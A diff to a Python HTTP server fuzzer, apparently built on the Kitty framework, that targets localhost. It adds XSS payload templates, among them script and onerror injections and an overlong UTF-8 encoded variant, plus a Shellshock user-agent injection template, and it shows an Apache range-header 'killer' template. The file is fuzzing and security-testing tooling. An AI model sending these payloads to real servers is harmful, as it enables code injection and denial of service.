@@ -28,43 +28,43 @@ lighttpd:	192.168.146.131		2018
 
 NAME="target"
 HOST="localhost"
-PORT=2015
+PORT=2017
 
 URL="http://"+HOST
 
 #==================================================================
 # Models
 http_get_01 = Template(name='HTTP_GET_01', fields=[
-    String('GET', name='method'),           # 1. Method - a string with the value "GET"
-    Delimiter(' ', name='space1'),          # 1.a The space between Method and Path
+    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
+    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
     String('/index.html', name='path'),     # 2. Path - a string with the value "/index.html"
-    Delimiter(' ', name='space2'),          # 2.a. The space between Path and Protocol
-    String('HTTP/1.0', name='protocol'),    # 3. Protocol - a string with the value "HTTP/1.1"
-    Delimiter('\r\n\r\n', name='eom'),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
+    Delimiter(' ', name='space2', fuzzable=False),          # 2.a. The space between Path and Protocol
+    String('HTTP/1.0', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
+    Delimiter('\r\n\r\n', name='eom', fuzzable=False),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
 ])
 
 
 
 
 http_get_02 = Template(name='HTTP_GET_02', fields=[
-    String('GET', name='method'),           # 1. Method - a string with the value "GET"
-    Delimiter(' ', name='space1'),          # 1.a The space between Method and Path
+    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
+    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
     String('/doc', name='path1'),     # 2. Path - a string with the value "/index.html"
 	String('/index.html', name='page1'),     # 2. Path - a string with the value "/index.html"
-    Delimiter(' ', name='space2'),          # 2.a. The space between Path and Protocol
-    String('HTTP/1.0', name='protocol'),    # 3. Protocol - a string with the value "HTTP/1.1"
-    Delimiter('\r\n\r\n', name='eom'),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
+    Delimiter(' ', name='space2', fuzzable=False),          # 2.a. The space between Path and Protocol
+    String('HTTP/1.0', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
+    Delimiter('\r\n\r\n', name='eom', fuzzable=False),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
 ])
 
 
 http_get_03 = Template(name='HTTP_GET_03', fields=[
-    String('GET', name='method'),           # 1. Method - a string with the value "GET"
-    Delimiter(' ', name='space1'),          # 1.a The space between Method and Path
+    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
+    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
     String('/index.html', name='path1'),     # 2. Path - a string with the value "/index.html"
-	String('?', name='path2'),     # 2. Path - a string with the value "/index.html"
+	String('?', name='path2', fuzzable=False),     # 2. Path - a string with the value "/index.html"
     String('doc', name='path3'),     # 2. Path - a string with the value "/index.html"
-    Delimiter(' ', name='space2'),          # 2.a. The space between Path and Protocol
-    String('HTTP/1.0', name='protocol'),    # 3. Protocol - a string with the value "HTTP/1.1"
+    Delimiter(' ', name='space2', fuzzable=False),          # 2.a. The space between Path and Protocol
+    String('HTTP/1.0', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
     Delimiter('\r\n\r\n', name='eom'),      
 ])
 
@@ -83,23 +83,23 @@ http_post_01 = Template(name='HTTP_POST_01', fields=[
 # Request- URI
 
 http_req_01 = Template(name='HTTP_REQ_01', fields=[
-    String('GET', name='method'),           # 1. Method - a string with the value "GET"
-    Delimiter(' ', name='space1'),          # 1.a The space between Method and Path
+    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
+    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
     String('/index.html', name='path'),     # 2. Path - a string with the value "/index.html"
     Delimiter(' ', name='space2'),          # 2.a. The space between Path and Protocol
-    String('HTTP/1.0', name='protocol'),    # 3. Protocol - a string with the value "HTTP/1.1"
-    Delimiter('\r\n\r\n', name='eom'),      
-	String('Host', name='host'), 
-	Delimiter(':', name='colon1'),
+    String('HTTP/1.0', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
+    Delimiter('\r\n\r\n', name='eom', fuzzable=False),      
+	String('Host', name='host', fuzzable=False), 
+	Delimiter(':', name='colon1', fuzzable=False),
 	Delimiter(' ', name='space3'),
-	String('localhost', name='host1'), 
+	String(URL, name='host1'), 
 ])
 
 
 
 http_req_02 = Template(name='HTTP_req_02', fields=[
-	String('GET', name='method'),           # 1. Method - a string with the value "GET"
-	Delimiter(' ', name='space1'),          # 1.a The space between Method and Path
+	String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
+	Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
 	String('/dir', name='path1'),
 	String('/page', name='path2'),
 	Delimiter('.', name='path3'),
@@ -113,37 +113,102 @@ http_req_02 = Template(name='HTTP_req_02', fields=[
 	Delimiter('=', name='path11'),
 	String('value2', name='path12'),
     Delimiter(' ', name='space2'),          # 2.a. The space between Path and Protocol
-    String('HTTP/1.0', name='protocol'),    # 3. Protocol - a string with the value "HTTP/1.1"
-    Delimiter('\r\n\r\n', name='eom'),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
-	String('Host', name='host'), 
-	Delimiter(':', name='colon1'),
+    String('HTTP/1.0', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
+    Delimiter('\r\n\r\n', name='eom', fuzzable=False),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
+	String('Host', name='host', fuzzable=False), 
+	Delimiter(':', name='colon1', fuzzable=False),
 	Delimiter(' ', name='space3'),
-	String('localhost', name='host1'), 
+	String(URL, name='host1'), 
 ])
+#==================================================================
+# Path
+
+
+
+
 
 
 #==================================================================
 # XSS
 
 http_xss_01 = Template(name='HTTP_XSS_01', fields=[
-    String('GET', name='method'),           # 1. Method - a string with the value "GET"
-    Delimiter(' ', name='space1'),          # 1.a The space between Method and Path
+    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
+    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
     String('/index.html', name='path'),     # 2. Path - a string with the value "/index.html"
 	String('\"<div><script>alert(1);</script>', name='xss'),
-    Delimiter(' ', name='space2'),          # 2.a. The space between Path and Protocol
-    String('HTTP/1.0', name='protocol'),    # 3. Protocol - a string with the value "HTTP/1.1"
+    Delimiter(' ', name='space2', fuzzable=False),          # 2.a. The space between Path and Protocol
+    String('HTTP/1.0', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
     Delimiter('\r\n\r\n', name='eom'),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
 ])
 
 
 
 http_xss_02 = Template(name='HTTP_XSS_02', fields=[
-    String('GET', name='method'),           # 1. Method - a string with the value "GET"
-    Delimiter(' ', name='space1'),          # 1.a The space between Method and Path
+    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
+    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
     String('/index.html', name='path'),     # 2. Path - a string with the value "/index.html"
 	String('\"<div><script>alert(1);</script>', name='xss'),
     Delimiter(' ', name='space2'),          # 2.a. The space between Path and Protocol
-    String('HTTP/1.0', name='protocol'),    # 3. Protocol - a string with the value "HTTP/1.1"
+    String('HTTP/1.0', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
+    Delimiter('\r\n\r\n', name='eom', fuzzable=False),   
+	String('Host: ', name='host', fuzzable=False),
+	String(URL, name='url', fuzzable=False),
+	Delimiter('\r\n\r\n', name='eom3'),
+	String('Content-type: ', name='ctypeh', fuzzable=False),
+	String('text/html', name='ctype'),
+	Delimiter('\r\n\r\n', name='eom4'),
+])
+
+
+http_xss_03 = Template(name='HTTP_XSS_03', fields=[
+    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
+    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
+    String('/index.html', name='path'),     # 2. Path - a string with the value "/index.html"
+	String('<input type="button" onclick="createSearchUrl('')" value="Copy url"/>\n', name='xss1'),
+	String('<script>\n', name='xss2'),
+	String("registerStatistics('searchTerm', '');\n", name='xss3'),
+	String('</script>\n', name='xss4'),
+    Delimiter(' ', name='space2', fuzzable=False),          # 2.a. The space between Path and Protocol
+    String('HTTP/1.0', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
+    Delimiter('\r\n\r\n', name='eom', fuzzable=False),   
+	String('Host: ', name='host'),
+	String(URL, name='url'),
+	Delimiter('\r\n\r\n', name='eom3'),
+	String('Content-type: ', name='ctypeh'),
+	String('text/html', name='ctype'),
+	Delimiter('\r\n\r\n', name='eom4'),
+])
+
+
+http_xss_04 = Template(name='HTTP_XSS_04', fields=[
+    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
+    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
+    String('/index.html', name='path'),     # 2. Path - a string with the value "/index.html" 
+	String('<img src=\"blah.jpg\" onerror=\"alert(\'XSS\')\"/>', name='xss1'),
+	String('<script>\n', name='xss2'),
+	String("registerStatistics('searchTerm', '');\n", name='xss3'),
+	String('</script>\n', name='xss4'),
+    Delimiter(' ', name='space2'),          # 2.a. The space between Path and Protocol
+    String('HTTP/1.0', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
+    Delimiter('\r\n\r\n', name='eom', fuzzable=False),   
+	String('Host: ', name='host'),
+	String(URL, name='url'),
+	Delimiter('\r\n\r\n', name='eom3'),
+	String('Content-type: ', name='ctypeh'),
+	String('text/html', name='ctype'),
+	Delimiter('\r\n\r\n', name='eom4'),
+])
+
+http_xss_05 = Template(name='HTTP_XSS_05', fields=[
+    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
+    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
+    String('/index.html', name='path'),     # 2. Path - a string with the value "/index.html" 
+	String('\"/><script>alert(1)</script>', name='xss1'),
+	String('<script>\n', name='xss2'),
+	String("registerStatistics('searchTerm', '');\n", name='xss3'),
+	String('</script>\n', name='xss4'),
+    Delimiter(' ', name='space2'),          # 2.a. The space between Path and Protocol
+    String('HTTP/1.0', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
     Delimiter('\r\n\r\n', name='eom'),   
 	String('Host: ', name='host'),
 	String(URL, name='url'),
@@ -154,11 +219,11 @@ http_xss_02 = Template(name='HTTP_XSS_02', fields=[
 ])
 
 
-http_xss_03 = Template(name='HTTP_XSS_03', fields=[
+http_xss_06 = Template(name='HTTP_XSS_06', fields=[
     String('GET', name='method'),           # 1. Method - a string with the value "GET"
     Delimiter(' ', name='space1'),          # 1.a The space between Method and Path
-    String('/index.html', name='path'),     # 2. Path - a string with the value "/index.html"
-	String('<input type="button" onclick="createSearchUrl('')" value="Copy url"/>\n', name='xss1'),
+    String('/sample.action?', name='path'),     # 2. Path - a string with the value "/index.html" 
+	String('myinput=%fc%80%80%80%80%a2%fc%80%80%80%80%bE%FC%80%80%80%80%BC%FC%80%80%80%81%B7%FC%80%80%80%81%A8%FC%80%80%80%81%B3%FC%80%80%80%81%A3%FC%80%80%80%81%A8%FC%80%80%80%81%A5%FC%80%80%80%81%A3%FC%80%80%80%81%AB%FC%80%80%80%80%BE%fc%80%80%80%80%bCscript%fc%80%80%80%80%bEalert%fc%80%80%80%80%a81%fc%80%80%80%80%a9%fc%80%80%80%80%bC%fc%80%80%80%80%aFscript%fc%80%80%80%80%bE', name='xss1'),
 	String('<script>\n', name='xss2'),
 	String("registerStatistics('searchTerm', '');\n", name='xss3'),
 	String('</script>\n', name='xss4'),
@@ -172,6 +237,18 @@ http_xss_03 = Template(name='HTTP_XSS_03', fields=[
 	String('text/html', name='ctype'),
 	Delimiter('\r\n\r\n', name='eom4'),
 ])
+#==================================================================
+
+http_ovf_01 = Template(name='HTTP_OVF_01', fields=[
+    String('GET', name='method'),           # 1. Method - a string with the value "GET"
+    Delimiter(' ', name='space1'),          # 1.a The space between Method and Path
+    String('/index.html', name='path'),     # 2. Path - a string with the value "/index.html"
+	String('?myinput=%fc%80%80%80%80%a2%fc%80%80%80%80%bE%FC%80%80%80%80%BC%FC%80%80%80%81%B7%FC%80%80%80%81%A8%FC%80%80%80%81%B3%FC%80%80%80%81%A3%FC%80%80%80%81%A8%FC%80%80%80%81%A5%FC%80%80%80%81%A3%FC%80%80%80%81%AB%FC%80%80%80%80%BE%fc%80%80%80%80%bCscript%fc%80%80%80%80%bEalert%fc%80%80%80%80%a81%fc%80%80%80%80%a9%fc%80%80%80%80%bC%fc%80%80%80%80%aFscript%fc%80%80%80%80%bE', name='xss'),
+    Delimiter(' ', name='space2'),          # 2.a. The space between Path and Protocol
+    String('HTTP/1.0', name='protocol'),    # 3. Protocol - a string with the value "HTTP/1.1"
+    Delimiter('\r\n\r\n', name='eom'),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
+])
+
 
 
 #==================================================================
@@ -246,8 +323,11 @@ apache_killer = Template(name='apache_killer', fields=[
 	Static('-', name='dash9'),
 	Dword(0, name='num0', encoder=ENC_INT_DEC),
 ])
- 
-shell_shock = Template(name='shell_shock', fields=[
+
+
+
+#========================================================================
+http_shell_01 = Template(name='http_shell_01', fields=[
 	String('GET / HTTP/1.1', name='method', fuzzable=False),
 	Delimiter('\r\n\r\n', name='eom1', fuzzable=False),
 	String('HTTP_USER_AGENT=() { :; }; /bin/', name='host', fuzzable=False),
@@ -315,6 +395,8 @@ class TcpTarget(ServerTarget):
 
 	def _receive_from_target(self):
 		return self.socket.recv(10000)
+
+
 #=====================================================================
 class LocalProcessController(BaseController):
 	def __init__(self, name, process_path, process_args, process_env=None,logger=None):
@@ -386,7 +468,7 @@ class LocalProcessController(BaseController):
 
 #=====================================================================
 if __name__=="__main__":
-	test_name = 'Server fuzzer 0.1'
+	test_name = 'Server fuzzer 0.2'
 	test_session='fuzz'					# 'test' or 'fuzz'
 
 	#---------------------------------------------
@@ -422,10 +504,13 @@ if __name__=="__main__":
 	#---------------------------------------------
 
 	model = GraphModel('model_01')
-
 	model.connect(http_get_01)
-	model.connect(http_get_01, http_req_01)
-	model.connect(http_req_01, http_xss_01)
+	model.connect(http_get_01, http_xss_01)
+	model.connect(http_xss_01, http_xss_02)
+	model.connect(http_xss_02, http_xss_03)
+	model.connect(http_xss_03, http_xss_04)
+	model.connect(http_xss_04, http_xss_05)
+	model.connect(http_xss_05, http_xss_06)
 
 
 
